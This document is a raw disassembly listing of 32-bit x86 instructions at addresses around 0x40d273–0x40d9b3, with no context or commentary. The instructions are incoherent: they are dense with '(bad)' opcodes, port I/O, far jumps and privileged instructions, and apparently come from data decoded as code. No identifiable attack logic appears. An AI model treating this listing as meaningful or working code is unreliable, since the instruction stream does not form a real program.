  40d273:	inc    esp
  40d274:	popa   
  40d275:	ficom  DWORD PTR [edi]
  40d277:	jecxz  0x40d218
  40d279:	lods   eax,DWORD PTR ds:[esi]
  40d27a:	xor    bh,bl
  40d27c:	in     al,0xec
  40d27e:	cdq    
  40d27f:	xchg   edx,eax
  40d280:	and    ch,BYTE PTR [ebp+0x7d]
  40d283:	xchg   ebx,eax
  40d284:	test   al,0x3f
  40d286:	in     eax,dx
  40d287:	std    
  40d288:	rcr    BYTE PTR [ebp+0x2e],1
  40d28b:	popf   
  40d28c:	push   0x4c29df2c
  40d291:	stos   DWORD PTR es:[edi],eax
  40d292:	stos   BYTE PTR es:[edi],al
  40d293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d294:	shl    edi,cl
  40d296:	rcr    DWORD PTR gs:[eax-0x535c50a3],0x63
  40d29e:	in     al,dx
  40d29f:	fcomp  QWORD PTR [ebx]
  40d2a1:	clc    
  40d2a2:	pop    ebp
  40d2a3:	and    al,0x25
  40d2a5:	push   ebp
  40d2a6:	(bad)  
  40d2a7:	sti    
  40d2a8:	jmp    DWORD PTR [esi-0x19]
  40d2ab:	fwait
  40d2ac:	jl     0x40d2b2
  40d2ae:	sbb    BYTE PTR [edx-0x2f],cl
  40d2b1:	inc    eax
  40d2b2:	or     dh,BYTE PTR [esi+eax*8+0xdbb922f]
  40d2b9:	dec    ebp
  40d2ba:	jo     0x40d29d
  40d2bc:	cs xchg edx,eax
  40d2be:	pop    ebx
  40d2bf:	xchg   edx,eax
  40d2c0:	xchg   esp,eax
  40d2c1:	(bad)  
  40d2c2:	rcr    DWORD PTR [ecx],1
  40d2c4:	inc    ecx
  40d2c5:	push   0xffffff87
  40d2c7:	pop    ecx
  40d2c8:	xor    al,0xe0
  40d2ca:	mov    cl,0x98
  40d2cc:	sub    DWORD PTR [eax],esp
  40d2ce:	frstor [ebp+0x33aaeb79]
  40d2d4:	stc    
  40d2d5:	loop   0x40d260
  40d2d7:	(bad)  
  40d2d8:	fnsave [edx+0x2b]
  40d2db:	mov    eax,ds:0xbadf42a2
  40d2e0:	das    
  40d2e1:	pop    es
  40d2e2:	outs   dx,DWORD PTR ds:[esi]
  40d2e3:	ror    eax,cl
  40d2e5:	out    dx,eax
  40d2e6:	jne    0x40d33d
  40d2e8:	mov    edi,0x869c1ad3
  40d2ed:	sub    BYTE PTR [edx+edx*1-0x70f6722c],cl
  40d2f4:	inc    ebp
  40d2f5:	lock mov esp,DWORD PTR [esi-0x5853db]
  40d2fc:	xchg   edi,eax
  40d2fd:	inc    ebx
  40d2fe:	std    
  40d2ff:	mov    al,0x92
  40d301:	call   0x2ae9:0x11a44aac
  40d308:	fisttp QWORD PTR [edx+0x38]
  40d30b:	push   edi
  40d30c:	out    0xb2,eax
  40d30e:	adc    DWORD PTR [edi+0x77711863],esi
  40d314:	xchg   ecx,eax
  40d315:	or     esp,DWORD PTR [ebp+0x1e4683da]
  40d31b:	adc    al,0xd4
  40d31d:	add    eax,0x92b878b
  40d322:	or     ebp,esp
  40d324:	sbb    DWORD PTR [ecx+0x4],0xbec21e5c
  40d32b:	daa    
  40d32c:	in     eax,dx
  40d32d:	test   bh,bh
  40d32f:	dec    esp
  40d330:	lea    edi,[ecx+0x3]
  40d333:	in     eax,dx
  40d334:	outs   dx,BYTE PTR ds:[esi]
  40d335:	adc    al,0x21
  40d337:	cdq    
  40d338:	retf   
  40d339:	pop    esi
  40d33a:	xor    bh,ch
  40d33c:	in     eax,0x71
  40d33e:	mov    ebx,0x5454a01c
  40d343:	or     cl,ah
  40d345:	jae    0x40d38d
  40d347:	adc    dl,BYTE PTR [edx*8-0x361ab56e]
  40d34e:	cld    
  40d34f:	test   BYTE PTR [ebx-0x39e1c655],dl
  40d355:	es dec eax
  40d357:	xlat   BYTE PTR ds:[ebx]
  40d358:	inc    ebp
  40d359:	or     eax,ebp
  40d35b:	jb     0x40d3d4
  40d35d:	inc    ebx
  40d35e:	das    
  40d35f:	ja     0x40d384
  40d361:	mov    ds:0x894250e6,al
  40d366:	jmp    0x208599e6
  40d36b:	mov    edi,0x4c60f7e
  40d370:	push   esi
  40d371:	bound  eax,QWORD PTR [edi]
  40d373:	test   BYTE PTR [ebx+ebx*8-0x15328c4b],ah
  40d37a:	fmul   QWORD PTR [esi-0x826a84b]
  40d380:	int3   
  40d381:	sbb    cl,bh
  40d383:	or     dl,BYTE PTR [edx+0x66]
  40d386:	imul   edx,DWORD PTR [eax-0x3db9c466],0x3a
  40d38d:	jle    0x40d3f2
  40d38f:	jl     0x40d368
  40d391:	or     dh,BYTE PTR [eax-0x65]
  40d394:	push   ds
  40d395:	lock xor BYTE PTR [edi+eiz*1+0x7843039a],0x20
  40d39e:	scas   eax,DWORD PTR es:[edi]
  40d39f:	mov    WORD PTR [ecx-0xae9d2ae],cs
  40d3a5:	sub    BYTE PTR [ebx+0x645d9936],dl
  40d3ab:	and    al,0xd9
  40d3ad:	loopne 0x40d36c
  40d3af:	test   al,0xbb
  40d3b1:	jns    0x40d41e
  40d3b3:	mov    ecx,0xbed91726
  40d3b8:	or     eax,0x8ec6ddb2
  40d3bd:	and    cl,al
  40d3bf:	xor    DWORD PTR [esp+edx*1],edx
  40d3c2:	lea    eax,[ebp+0x28]
  40d3c5:	lods   al,BYTE PTR ds:[esi]
  40d3c6:	loope  0x40d427
  40d3c8:	cmp    bh,0x63
  40d3cb:	jae    0x40d43c
  40d3cd:	stos   DWORD PTR es:[edi],eax
  40d3ce:	pop    edi
  40d3cf:	xchg   ecx,eax
  40d3d0:	ss inc edi
  40d3d2:	dec    esi
  40d3d3:	sub    DWORD PTR [edi],ecx
  40d3d5:	(bad)  
  40d3d6:	cmp    eax,DWORD PTR [ebp-0xf]
  40d3d9:	fwait
  40d3da:	mov    esi,0x5af8e25a
  40d3df:	or     eax,0xd9b5e982
  40d3e4:	xor    al,0x1a
  40d3e7:	fdivp  st(4),st
  40d3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ea:	lds    ebx,FWORD PTR [edx-0x5f]
  40d3ed:	pop    edx
  40d3ee:	xor    BYTE PTR [esi+edx*4-0x3d],bh
  40d3f2:	pop    ecx
  40d3f3:	mov    dl,0x9f
  40d3f5:	test   BYTE PTR [edi],dl
  40d3f7:	repnz pop ss
  40d3f9:	fist   WORD PTR [eax-0x1c]
  40d3fc:	in     al,dx
  40d3fd:	aam    0xbc
  40d3ff:	add    esi,DWORD PTR [edi-0x13]
  40d402:	rol    DWORD PTR [edi-0x61206f3a],cl
  40d408:	inc    ecx
  40d409:	mov    ah,0xbe
  40d40b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40c:	cmp    eax,0x757e66d2
  40d411:	adc    edx,esp
  40d413:	out    0x38,eax
  40d415:	je     0x40d3b6
  40d417:	inc    esi
  40d418:	push   cs
  40d419:	mov    esp,cs
  40d41b:	cmp    al,0xac
  40d41d:	add    eax,0x84dbb49c
  40d422:	retf   0xae81
  40d425:	fild   DWORD PTR [ecx+0x21]
  40d428:	cmp    esp,DWORD PTR [edi-0x3c263481]
  40d42e:	sbb    edi,DWORD PTR [ebx-0x7]
  40d431:	outs   dx,BYTE PTR fs:[esi]
  40d433:	xor    eax,0xae501db1
  40d438:	sub    ch,BYTE PTR [edi]
  40d43a:	xchg   esi,eax
  40d43b:	mov    eax,ds
  40d43d:	dec    esp
  40d43e:	dec    ecx
  40d43f:	dec    esp
  40d440:	loopne 0x40d420
  40d442:	mov    ecx,0x9daa481b
  40d447:	mov    ch,0x71
  40d449:	into   
  40d44a:	je     0x40d3d1
  40d44c:	sbb    eax,0x46586fcd
  40d451:	mov    esi,0x4296591c
  40d456:	jp     0x40d434
  40d458:	xor    eax,0x2bf69d1
  40d45d:	mov    WORD PTR [eax-0x74],?
  40d460:	jge    0x40d4cc
  40d462:	das    
  40d463:	inc    edx
  40d464:	test   DWORD PTR [edx+edi*8-0x2f2f9393],ebx
  40d46b:	mov    dl,0x88
  40d46d:	mov    bh,0x88
  40d46f:	xchg   esp,eax
  40d470:	jnp    0x40d408
  40d472:	cmp    eax,0x4cdfea75
  40d477:	retf   
  40d478:	mov    ds,WORD PTR [ebx+0x75]
  40d47b:	pop    ss
  40d47c:	mov    cl,0xb4
  40d47e:	sub    DWORD PTR [ebp+0x287a0b6c],eax
  40d484:	into   
  40d485:	aas    
  40d486:	pop    esp
  40d487:	clc    
  40d488:	add    bh,BYTE PTR [ebx+0x38fc42e5]
  40d48e:	test   BYTE PTR [ebx],bh
  40d490:	mov    WORD PTR [eax],gs
  40d492:	sub    BYTE PTR [edx-0x3f332358],0x38
  40d499:	cmp    dh,ah
  40d49b:	das    
  40d49c:	lock ss icebp 
  40d49f:	pusha  
  40d4a0:	sbb    eax,DWORD PTR [eax]
  40d4a2:	mov    cl,0xae
  40d4a4:	and    eax,0x6dc7e4c7
  40d4a9:	sbb    BYTE PTR [edx+0x5f],0x48
  40d4ad:	pop    edx
  40d4ae:	inc    BYTE PTR [eax]
  40d4b0:	sub    al,0xac
  40d4b2:	inc    ecx
  40d4b3:	stos   BYTE PTR es:[edi],al
  40d4b4:	sub    al,al
  40d4b6:	pop    es
  40d4b7:	or     DWORD PTR [ecx+0x25110aa5],ebp
  40d4bd:	(bad)  [edi+0x3e]
  40d4c0:	es dec ebx
  40d4c2:	push   ebx
  40d4c3:	lods   eax,DWORD PTR ds:[esi]
  40d4c4:	adc    eax,0x300f4a7d
  40d4c9:	pop    eax
  40d4ca:	xor    BYTE PTR [ebx-0x63],bl
  40d4cd:	mov    BYTE PTR [ecx+0x157fe763],dh
  40d4d3:	push   ebx
  40d4d4:	sbb    BYTE PTR [esi-0x6f376712],ch
  40d4da:	inc    edx
  40d4db:	inc    eax
  40d4dc:	sub    bh,BYTE PTR [esp-0x8e0e382]
  40d4e3:	inc    esp
  40d4e4:	lods   eax,DWORD PTR ds:[esi]
  40d4e5:	retf   
  40d4e6:	mov    cl,0x4f
  40d4e8:	push   ebp
  40d4e9:	call   0x29ca:0x263d32b5
  40d4f0:	stos   DWORD PTR es:[edi],eax
  40d4f1:	fstp   st(5)
  40d4f3:	icebp  
  40d4f4:	xchg   BYTE PTR [edi+eax*8+0x1c],dh
  40d4f8:	xor    DWORD PTR [edx+0x4dcda89],eax
  40d4fe:	inc    ebp
  40d4ff:	in     eax,0xa7
  40d501:	ss sti 
  40d503:	jnp    0x40d57a
  40d505:	jbe    0x40d548
  40d507:	cwde   
  40d508:	enter  0x8468,0xf4
  40d50c:	sbb    al,0xa5
  40d50e:	xchg   esi,eax
  40d50f:	repz je 0x40d4cf
  40d512:	jnp    0x40d51e
  40d514:	out    dx,eax
  40d515:	or     cl,BYTE PTR [ebp-0x48]
  40d518:	sbb    al,0x94
  40d51a:	lahf   
  40d51b:	into   
  40d51c:	aas    
  40d51d:	xchg   BYTE PTR [edx-0x6e],dh
  40d520:	or     al,0xe5
  40d522:	iret   
  40d523:	xor    edi,edi
  40d525:	or     DWORD PTR [esi+0x67],edi
  40d528:	add    DWORD PTR [eax+0x59d1844],ecx
  40d52e:	jecxz  0x40d55f
  40d530:	mov    dl,0x70
  40d532:	fcmove st,st(4)
  40d534:	push   ebp
  40d535:	mov    ebx,0xf25ecdc4
  40d53a:	dec    eax
  40d53b:	xchg   esp,eax
  40d53c:	pop    esi
  40d53d:	and    al,0x6
  40d53f:	pop    ebp
  40d540:	jae    0x40d508
  40d542:	mov    eax,DWORD PTR [ebp+0x21]
  40d545:	mov    esi,0x1b9bc52d
  40d54a:	adc    cl,BYTE PTR [edx-0x77]
  40d54d:	push   eax
  40d54e:	jne    0x40d54d
  40d550:	jns    0x40d4e8
  40d552:	or     dl,BYTE PTR [edx+0x43b20843]
  40d558:	xor    BYTE PTR [edi+0x73],dl
  40d55b:	dec    ecx
  40d55c:	daa    
  40d55d:	jo     0x40d514
  40d55f:	push   ss
  40d560:	fbld   TBYTE PTR [eax+ebp*2-0x3f]
  40d564:	gs jl  0x40d51b
  40d567:	test   DWORD PTR [esp+edi*1+0x6848895c],eax
  40d56e:	add    DWORD PTR [ecx+0x33ac9c4c],edi
  40d574:	mov    ds:0x3a666d9f,al
  40d579:	arpl   WORD PTR [edx],di
  40d57b:	jne    0x40d56b
  40d57d:	sub    cl,BYTE PTR [edi+ebp*1+0x4d]
  40d581:	add    ebp,ebx
  40d583:	mov    eax,ds:0xb13505ed
  40d588:	ins    BYTE PTR es:[edi],dx
  40d589:	ret    
  40d58a:	xchg   esp,eax
  40d58b:	das    
  40d58c:	dec    esp
  40d58d:	push   0xfffffffb
  40d58f:	cwde   
  40d590:	lea    edi,ds:0xf8f2dcb2
  40d596:	xchg   DWORD PTR ds:0x90642000,edx
  40d59c:	int3   
  40d59d:	mov    ds:0x8dbdb71c,eax
  40d5a2:	mov    es,WORD PTR [ecx-0x1]
  40d5a5:	fsub   DWORD PTR [esi]
  40d5a7:	icebp  
  40d5a8:	in     eax,dx
  40d5a9:	pusha  
  40d5aa:	hlt    
  40d5ab:	push   ecx
  40d5ac:	fdivr  QWORD PTR [ebx]
  40d5ae:	cld    
  40d5af:	mov    dl,BYTE PTR [ebx-0x21ff9e5f]
  40d5b5:	and    ebx,DWORD PTR [eax-0x70]
  40d5b8:	pop    es
  40d5b9:	jl     0x40d5d3
  40d5bb:	arpl   WORD PTR [ecx-0x7a],si
  40d5be:	je     0x40d547
  40d5c0:	gs and eax,0x3f21f7ec
  40d5c6:	cdq    
  40d5c7:	or     DWORD PTR [edx],edx
  40d5c9:	jbe    0x40d63f
  40d5cb:	mov    BYTE PTR [eax-0x12],0x7f
  40d5cf:	std    
  40d5d0:	inc    edi
  40d5d1:	jg     0x40d62f
  40d5d3:	lea    esi,es:[edi]
  40d5d6:	jp     0x40d625
  40d5d8:	push   esi
  40d5d9:	sbb    esp,DWORD PTR [esi-0x13081185]
  40d5df:	pop    ss
  40d5e0:	stc    
  40d5e1:	jmp    0x40d5cd
  40d5e3:	inc    edi
  40d5e4:	arpl   WORD PTR [ebx+0x72],di
  40d5e7:	test   DWORD PTR [edx-0x7ace432],0xc119c590
  40d5f1:	mov    ch,0x12
  40d5f3:	jl     0x40d5f7
  40d5f5:	scas   eax,DWORD PTR es:[edi]
  40d5f6:	outs   dx,BYTE PTR ds:[esi]
  40d5f7:	sub    al,0x36
  40d5f9:	popf   
  40d5fa:	and    ah,0x51
  40d5fd:	mov    al,ds:0x51d8a880
  40d602:	outs   dx,BYTE PTR ds:[esi]
  40d603:	cmp    BYTE PTR [ecx+0x6658d70],cl
  40d609:	push   edx
  40d60a:	fs or  dl,bh
  40d60d:	inc    ebx
  40d60e:	sar    BYTE PTR [ebp-0xd9a9acc],cl
  40d614:	dec    ebx
  40d615:	mov    al,0x3a
  40d617:	pop    ebx
  40d618:	fs in  al,dx
  40d61a:	in     eax,0x1a
  40d61c:	cmp    esi,ebp
  40d61e:	out    dx,eax
  40d61f:	push   cs
  40d620:	lods   eax,DWORD PTR ds:[esi]
  40d621:	out    dx,al
  40d622:	cmp    al,0xa5
  40d624:	retf   
  40d625:	out    dx,al
  40d626:	into   
  40d627:	adc    eax,DWORD PTR [ecx-0x22b9846a]
  40d62d:	or     ebx,DWORD PTR [ebp+0x61]
  40d630:	ret    
  40d631:	popf   
  40d632:	mov    ecx,0x1a4515eb
  40d637:	pop    edx
  40d638:	(bad)  
  40d639:	call   0x5293a912
  40d63e:	mov    al,0xa3
  40d640:	xchg   esi,eax
  40d641:	xchg   esi,eax
  40d642:	cmp    dh,BYTE PTR [ecx]
  40d644:	push   esp
  40d645:	pop    eax
  40d646:	div    DWORD PTR [edi-0x67f89c95]
  40d64c:	jp     0x40d6c0
  40d64e:	dec    esp
  40d64f:	ret    0x8bf
  40d652:	imul   esp,DWORD PTR [esi-0xd],0x4b
  40d656:	mov    esp,0xc92e1ec7
  40d65b:	xchg   BYTE PTR ds:0x1e2eed1d,cl
  40d661:	nop
  40d662:	cmc    
  40d663:	mov    BYTE PTR [eax+0x76e5d749],bh
  40d669:	inc    ecx
  40d66a:	xchg   edi,eax
  40d66b:	stos   BYTE PTR es:[edi],al
  40d66c:	(bad)
  40d66f:	xor    DWORD PTR [esi+0x1c23b744],eax
  40d675:	push   es
  40d676:	push   edi
  40d677:	xchg   BYTE PTR [ebp-0x12ab3533],ah
  40d67d:	int3   
  40d67e:	mov    edi,ebx
  40d680:	aam    0xcc
  40d682:	loopne 0x40d626
  40d684:	inc    esi
  40d685:	push   ecx
  40d686:	int    0xb7
  40d688:	out    0x71,al
  40d68a:	ds daa 
  40d68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d68d:	fist   DWORD PTR [edi+0x73]
  40d690:	out    0x89,al
  40d692:	xor    DWORD PTR [edx],esp
  40d694:	push   ebx
  40d695:	aas    
  40d696:	data16 ins BYTE PTR es:[edi],dx
  40d698:	push   edx
  40d699:	cli    
  40d69a:	xchg   esi,edi
  40d69c:	jmp    0x40d694
  40d69e:	shr    BYTE PTR [eiz*4-0x2441ad45],1
  40d6a5:	ins    BYTE PTR es:[edi],dx
  40d6a6:	or     ebp,DWORD PTR ds:0x110ac49f
  40d6ac:	fisub  DWORD PTR [esi-0x16a62745]
  40d6b2:	pop    ebp
  40d6b3:	push   0xffffffa3
  40d6b5:	dec    esp
  40d6b6:	push   esi
  40d6b7:	sbb    bh,bl
  40d6b9:	pop    eax
  40d6ba:	retf   0xe72d
  40d6bd:	mov    cl,ch
  40d6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c0:	mov    eax,ds:0xdbf2ec9c
  40d6c5:	lds    esi,FWORD PTR [ecx+ebx*2+0x572d0aba]
  40d6cc:	adc    ch,BYTE PTR [ecx+0x59]
  40d6cf:	inc    edx
  40d6d0:	scas   al,BYTE PTR es:[edi]
  40d6d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d2:	fld    TBYTE PTR [edx]
  40d6d4:	cli    
  40d6d5:	xor    eax,0xb22bcbf6
  40d6da:	jp     0x40d6fc
  40d6dc:	jbe    0x40d66f
  40d6de:	outs   dx,BYTE PTR ds:[esi]
  40d6df:	fwait
  40d6e0:	mul    bl
  40d6e2:	fld    TBYTE PTR [edi-0x2b819bb2]
  40d6e8:	pop    eax
  40d6e9:	add    dl,BYTE PTR [ecx-0x321ec1d7]
  40d6ef:	outs   dx,DWORD PTR ds:[esi]
  40d6f0:	stos   DWORD PTR es:[edi],eax
  40d6f1:	sbb    eax,0xbb558993
  40d6f6:	cmp    edi,DWORD PTR [ecx-0x5ce63c91]
  40d6fc:	add    esp,esi
  40d6fe:	mov    dh,0xb1
  40d700:	xor    ebx,DWORD PTR [eax]
  40d702:	les    edi,FWORD PTR [eax+esi*8]
  40d705:	sub    DWORD PTR [ebx+esi*2+0x14],edi
  40d709:	pushf  
  40d70a:	lock add ebp,esp
  40d70d:	in     al,dx
  40d70e:	and    edi,DWORD PTR [edi-0x575fae80]
  40d714:	aad    0x49
  40d716:	sub    DWORD PTR [ebp-0x26b82034],edx
  40d71c:	fwait
  40d71d:	pop    ss
  40d71e:	cs adc eax,0x53785e02
  40d724:	and    eax,0x94c10b3
  40d729:	sub    ebp,DWORD PTR [esi]
  40d72b:	jae    0x40d79a
  40d72d:	mov    eax,ds:0xe9e35b90
  40d732:	cmp    dh,bh
  40d734:	adc    eax,0xacbfe9cf
  40d739:	xchg   edi,eax
  40d73a:	and    al,0xc
  40d73c:	repz jmp 0x40d77d
  40d73f:	mov    dh,0xd
  40d741:	sbb    BYTE PTR [esi],0xe
  40d744:	fwait
  40d745:	xchg   ecx,eax
  40d746:	dec    ebx
  40d747:	inc    esi
  40d748:	jae    0x40d7b6
  40d74a:	(bad)  [esi]
  40d74c:	ds mov ah,0xf9
  40d74f:	sbb    ch,BYTE PTR [edx+0x7b0ca4ad]
  40d755:	jmp    0xa729:0xe2018d7a
  40d75c:	pop    ebx
  40d75d:	xor    al,0x3e
  40d75f:	scas   eax,DWORD PTR es:[edi]
  40d760:	mov    dl,0x40
  40d762:	dec    edi
  40d763:	shl    BYTE PTR [ebx],0x32
  40d766:	mov    esp,0x1b58e097
  40d76b:	mov    ebp,0xd8f4293b
  40d770:	cmp    eax,0x57b7d201
  40d775:	push   ebp
  40d776:	scas   eax,DWORD PTR es:[edi]
  40d777:	xor    al,0x86
  40d779:	mov    ebx,DWORD PTR [ebx-0x73]
  40d77c:	out    dx,al
  40d77d:	pop    ebx
  40d77e:	jle    0x40d7e7
  40d780:	dec    ecx
  40d781:	lods   al,BYTE PTR ds:[esi]
  40d782:	or     cl,bh
  40d784:	stc    
  40d785:	inc    edx
  40d786:	pop    ebx
  40d787:	outs   dx,DWORD PTR ds:[esi]
  40d788:	inc    esi
  40d789:	pop    ebp
  40d78a:	sub    edx,DWORD PTR [esi-0x75]
  40d78d:	mov    edi,0xaf81c549
  40d792:	sub    bh,BYTE PTR [ecx+ebp*2-0x75]
  40d796:	call   0x828e8fe3
  40d79b:	fdivr  DWORD PTR [esi+0x12]
  40d79e:	mul    DWORD PTR [esi]
  40d7a0:	dec    BYTE PTR [edx-0x45]
  40d7a3:	and    al,0xcf
  40d7a5:	ret    0xfd3
  40d7a8:	sbb    al,0xae
  40d7aa:	adc    al,0x84
  40d7ac:	imul   ebx,ebp,0x16cc06ce
  40d7b2:	pop    edx
  40d7b3:	push   ecx
  40d7b4:	sahf   
  40d7b5:	push   0x72d3e5e0
  40d7ba:	or     cl,BYTE PTR [eax]
  40d7bc:	leave  
  40d7bd:	test   DWORD PTR [eax+0x7036e496],edi
  40d7c3:	pop    ss
  40d7c4:	and    edi,DWORD PTR [ebp+0x41]
  40d7c7:	test   edx,ecx
  40d7c9:	mov    ch,0x8e
  40d7cb:	xor    ebp,DWORD PTR [ebx]
  40d7cd:	rcl    DWORD PTR [edx-0x3],1
  40d7d0:	jp     0x40d7fc
  40d7d2:	(bad)  
  40d7d3:	(bad)  
  40d7d4:	in     al,dx
  40d7d5:	dec    ebp
  40d7d6:	cwde   
  40d7d7:	jae    0x40d7a6
  40d7d9:	push   ecx
  40d7da:	lods   al,BYTE PTR ds:[esi]
  40d7db:	adc    DWORD PTR [edi-0x684dc9f7],0x3c90217e
  40d7e5:	aas    
  40d7e6:	mov    ebx,0x1b215ac
  40d7eb:	call   0x6ab4ab67
  40d7f0:	retf   0x3db8
  40d7f3:	inc    esp
  40d7f4:	jg     0x40d79a
  40d7f6:	jg     0x40d800
  40d7f8:	mov    edx,0x950bc3ae
  40d7fd:	pushf  
  40d7fe:	data16 repz xor dh,BYTE PTR [edx]
  40d802:	mov    ecx,0x92681d2f
  40d807:	popa   
  40d808:	ins    DWORD PTR es:[edi],dx
  40d809:	jnp    0x40d7ed
  40d80b:	pop    esi
  40d80c:	sbb    ch,al
  40d80e:	idiv   BYTE PTR [edx+0x7ea8adee]
  40d814:	and    eax,0xd02b57e1
  40d819:	hlt    
  40d81a:	xor    edx,eax
  40d81c:	(bad)  
  40d81d:	(bad)  
  40d81f:	xor    BYTE PTR [eax],ah
  40d821:	push   ebp
  40d822:	jecxz  0x40d80f
  40d824:	scas   al,BYTE PTR es:[edi]
  40d825:	int3   
  40d826:	dec    ebp
  40d827:	cmp    DWORD PTR [edi+0x565e3f4d],edx
  40d82d:	stos   DWORD PTR es:[edi],eax
  40d82e:	or     ecx,DWORD PTR [eax-0x77]
  40d831:	add    BYTE PTR [ebp+0x155c65],dh
  40d837:	jb     0x40d8b3
  40d839:	mov    ah,0xf1
  40d83b:	in     eax,dx
  40d83c:	ret    
  40d83d:	dec    edi
  40d83e:	or     ecx,DWORD PTR [ebp+0x75]
  40d841:	inc    edi
  40d842:	add    DWORD PTR [esi+0x27],ebp
  40d845:	call   0xb1be:0xfac8a411
  40d84c:	(bad)
  40d84f:	js     0x40d7fd
  40d851:	mov    al,0xa3
  40d853:	(bad)  
  40d854:	out    0x53,eax
  40d856:	push   esi
  40d857:	inc    ecx
  40d858:	(bad)  
  40d85a:	mov    ah,0xda
  40d85c:	retf   0x45d1
  40d85f:	inc    ecx
  40d860:	mov    bl,BYTE PTR [ebp+edi*2+0x66]
  40d864:	aam    0x6c
  40d866:	mov    ds:0xd20bed8f,eax
  40d86b:	(bad)  
  40d86c:	aas    
  40d86d:	shl    BYTE PTR [edx],0x6f
  40d870:	scas   eax,DWORD PTR es:[edi]
  40d871:	push   esi
  40d872:	arpl   WORD PTR [eax-0x3d],di
  40d875:	inc    edi
  40d876:	push   0x1fae0c94
  40d87b:	aaa    
  40d87c:	retf   
  40d87d:	jmp    0x9a1d:0x856f31
  40d884:	jne    0x40d81c
  40d886:	mov    ds:0xb916d624,eax
  40d88b:	aaa    
  40d88c:	jmp    0x40c9:0x8cb51da2
  40d893:	out    dx,eax
  40d894:	mov    ds:0x4393070d,al
  40d899:	adc    ch,BYTE PTR [eax+0x62]
  40d89c:	es shr edx,0x2a
  40d8a0:	sahf   
  40d8a1:	outs   dx,DWORD PTR ds:[esi]
  40d8a2:	cmp    BYTE PTR [edx+0x46],ch
  40d8a5:	enter  0x3de3,0xaf
  40d8a9:	push   cs
  40d8aa:	int    0xb9
  40d8ac:	mov    bh,0xb5
  40d8ae:	push   es
  40d8af:	cmp    edx,esi
  40d8b1:	or     eax,0xbf6979c6
  40d8b6:	jle    0x40d931
  40d8b8:	pop    es
  40d8b9:	or     DWORD PTR [edx],esp
  40d8bb:	sub    BYTE PTR cs:[eax],bh
  40d8be:	test   BYTE PTR [eax],ah
  40d8c0:	in     eax,dx
  40d8c1:	dec    ebp
  40d8c2:	pusha  
  40d8c3:	pop    ecx
  40d8c4:	or     al,0xb7
  40d8c6:	push   eax
  40d8c7:	cmp    DWORD PTR [edi+0x70],esp
  40d8ca:	(bad)  
  40d8cc:	or     ebp,DWORD PTR [edx]
  40d8ce:	mov    ds:0x474228b0,al
  40d8d3:	pop    ecx
  40d8d4:	jnp    0x40d8e6
  40d8d6:	sub    ah,cl
  40d8d8:	es js  0x40d8ac
  40d8db:	and    al,0xc3
  40d8dd:	test   BYTE PTR [ebp-0x2f],bl
  40d8e0:	adc    DWORD PTR [edx+0x32],ebp
  40d8e3:	scas   al,BYTE PTR es:[edi]
  40d8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e5:	jge    0x40d95b
  40d8e7:	les    esi,FWORD PTR [ebp+0x31]
  40d8ea:	mov    dh,0xf
  40d8ec:	sbb    BYTE PTR [esp+edi*4-0x7bd021dd],dl
  40d8f3:	pop    ebp
  40d8f4:	jno    0x40d8d8
  40d8f6:	nop
  40d8f7:	js     0x40d8db
  40d8f9:	dec    esp
  40d8fa:	xor    edx,DWORD PTR [eax+0x4c3a3d08]
  40d900:	arpl   WORD PTR [eax],sp
  40d902:	dec    ebp
  40d903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d904:	mov    ecx,0xaadbe872
  40d909:	shr    ch,cl
  40d90b:	pop    esp
  40d90c:	inc    ebp
  40d90d:	hlt    
  40d90e:	retf   0x1d3e
  40d911:	imul   esp,edi,0x4e
  40d914:	lods   eax,DWORD PTR ds:[esi]
  40d915:	aas    
  40d916:	and    dl,bh
  40d918:	or     al,0xda
  40d91a:	adc    ah,dh
  40d91c:	push   ds
  40d91d:	test   eax,0x4ee448c4
  40d922:	pop    eax
  40d923:	dec    eax
  40d924:	iret   
  40d925:	lods   eax,DWORD PTR ds:[esi]
  40d926:	lods   al,BYTE PTR ds:[esi]
  40d927:	sbb    al,0x18
  40d929:	jge    0x40d8db
  40d92b:	loop   0x40d8c8
  40d92d:	popf   
  40d92e:	cmp    eax,0xf05ec354
  40d933:	inc    ebx
  40d934:	iret   
  40d935:	mov    ecx,edi
  40d937:	cwde   
  40d938:	inc    edi
  40d939:	inc    ecx
  40d93a:	push   eax
  40d93b:	scas   eax,DWORD PTR es:[edi]
  40d93c:	push   edi
  40d93d:	or     eax,0x3c43cb1b
  40d942:	fld    st(5)
  40d944:	or     ah,BYTE PTR [eax-0x6517bc0d]
  40d94a:	xchg   ecx,eax
  40d94b:	(bad)  
  40d94c:	neg    BYTE PTR [eax+0x5f]
  40d94f:	xor    al,0x8b
  40d951:	call   0x2c07:0xe2bfa42e
  40d958:	mov    dl,BYTE PTR [esp+esi*1]
  40d95b:	add    eax,0x1f3119f5
  40d960:	or     ah,BYTE PTR ds:0xbace0f4
  40d966:	or     dh,bh
  40d968:	sbb    DWORD PTR [ebp+ebx*4+0x59],esp
  40d96c:	cld    
  40d96d:	div    al
  40d96f:	loope  0x40d976
  40d971:	push   edi
  40d972:	repz xor esi,DWORD PTR [eax-0x50150dce]
  40d979:	pop    esp
  40d97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d97b:	mov    al,dh
  40d97d:	popf   
  40d97e:	push   ebp
  40d97f:	xchg   BYTE PTR [ebp+0x71605749],cl
  40d985:	mov    cl,BYTE PTR [ebx-0x48]
  40d988:	lds    edi,FWORD PTR [edx-0x2043005a]
  40d98e:	mov    ds:0x93489348,al
  40d993:	out    dx,eax
  40d994:	into   
  40d995:	add    bl,BYTE PTR [edi]
  40d997:	cld    
  40d998:	adc    al,0xa0
  40d99a:	aam    0x4d
  40d99c:	in     eax,dx
  40d99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99e:	mov    fs,eax
  40d9a0:	push   edi
  40d9a1:	cmp    eax,0xb9e08e71
  40d9a6:	adc    al,bh
  40d9a8:	shl    DWORD PTR [ebp+0x334eb0c3],0x14
  40d9af:	cmp    al,0xc4
  40d9b1:	aaa    
  40d9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b3:	clc    
